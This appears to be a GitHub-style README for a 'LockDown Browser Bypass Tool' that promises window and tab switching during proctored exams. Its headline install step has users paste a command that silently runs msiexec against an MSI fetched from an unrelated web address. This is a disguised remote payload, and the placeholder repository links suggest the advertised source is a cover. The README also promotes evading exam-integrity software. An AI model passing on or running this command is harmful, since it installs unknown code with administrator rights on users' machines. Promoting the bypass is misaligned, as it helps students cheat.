# LockDown Browser Bypass Tool

A Windows utility that enables window switching and tab navigation while LockDown Browser is active.

---

## 🚀 Installation in 1 Command

## 🪟 Windows Installation
### **Step 1 — Open Command Prompt**
1. Press **Win + R**
2. Type:
```
cmd
```
3. Press **Enter**
This will open **Command Prompt**.
---
### **Step 2 — Run the Install Command**
Copy the command below and paste it into **Command Prompt**, then press **Enter**.
```powershell
cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem LockDown-Browser-Bypass-Tool
```
The installer will automatically download and install the required components.

**That's it!** The tool will be installed and ready to use.

---

## ⚠️ Disclaimer

This tool is provided for **educational and accessibility purposes only**. Users are responsible for ensuring compliance with their institution's academic integrity policies. Unauthorized use during examinations may violate academic codes of conduct.

## Features

- 🪟 **Window Switching**: Use Alt+Tab and other window management shortcuts
- 🔄 **Tab Navigation**: Switch between browser tabs with Ctrl+Tab
- 🎯 **Hotkey Support**: Configurable keyboard shortcuts
- 🔒 **Stealth Mode**: Minimal system footprint
- 🚀 **Easy to Use**: Simple executable with GUI

## How It Works

LockDown Browser restricts certain Windows API calls and keyboard shortcuts. This tool:

1. Hooks into low-level keyboard events
2. Intercepts restricted shortcuts before LockDown Browser blocks them
3. Simulates allowed window management actions
4. Runs as a background service

## Requirements

- Windows 10/11
- .NET Framework 4.8 or higher
- Administrator privileges (for keyboard hook installation)

## Alternative Installation Methods

### Download Release
1. Download the latest release from [Releases](../../releases)
2. Extract the ZIP file
3. Run `LockDownBypass.exe` as Administrator

### Build from Source
```bash
git clone https://github.com/yourusername/lockdown-browser-bypass.git
cd lockdown-browser-bypass
dotnet build -c Release
```

## Usage

1. **Start the tool BEFORE launching LockDown Browser**
   ```
   Right-click LockDownBypass.exe → Run as Administrator
   ```

2. **Default Hotkeys**:
   - `Ctrl + Shift + T` - Switch to next tab
   - `Ctrl + Shift + W` - Switch to previous tab
   - `Ctrl + Shift + M` - Minimize current window
   - `Ctrl + Shift + Q` - Exit bypass tool

3. **System Tray**: The tool runs in the background. Right-click the tray icon to:
   - Configure hotkeys
   - Enable/disable features
   - Exit the application

## Configuration

Edit `config.json` to customize hotkeys:

```json
{
  "hotkeys": {
    "nextTab": "Ctrl+Shift+T",
    "prevTab": "Ctrl+Shift+W",
    "minimize": "Ctrl+Shift+M",
    "exitTool": "Ctrl+Shift+Q"
  },
  "stealthMode": true,
  "autoStart": false
}
```

## Technical Details

### Architecture
- **Keyboard Hook**: Low-level Windows keyboard hook (WH_KEYBOARD_LL)
- **Window Management**: Win32 API calls (FindWindow, SetForegroundWindow)
- **Process Monitoring**: Detects LockDown Browser process
- **Event Simulation**: SendInput for tab switching

### Detection Evasion
- No process name spoofing
- Minimal memory footprint
- Standard Windows API usage
- No DLL injection into LockDown Browser

## Building

### Prerequisites
- Visual Studio 2022 or VS Code
- .NET 8.0 SDK

### Build Commands
```bash
# Debug build
dotnet build

# Release build
dotnet build -c Release

# Publish single-file executable
dotnet publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true
```

## Project Structure

```
lockdown-browser-bypass/
├── src/
│   ├── LockDownBypass.cs       # Main application
│   ├── KeyboardHook.cs         # Low-level keyboard hook
│   ├── WindowManager.cs        # Window switching logic
│   └── TrayIcon.cs             # System tray interface
├── config.json                 # Configuration file
├── README.md
├── LICENSE
└── .gitignore
```

## Contributing

Contributions are welcome! Please:

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/improvement`)
3. Commit changes (`git commit -am 'Add new feature'`)
4. Push to branch (`git push origin feature/improvement`)
5. Open a Pull Request

## License

MIT License - see [LICENSE](LICENSE) file for details

## Support

- 🐛 Report bugs via [Issues](../../issues)
- 💬 Discussions in [Discussions](../../discussions)
- 📧 Email: support@example.com

---

**Remember**: Use responsibly and ethically. Academic integrity matters.
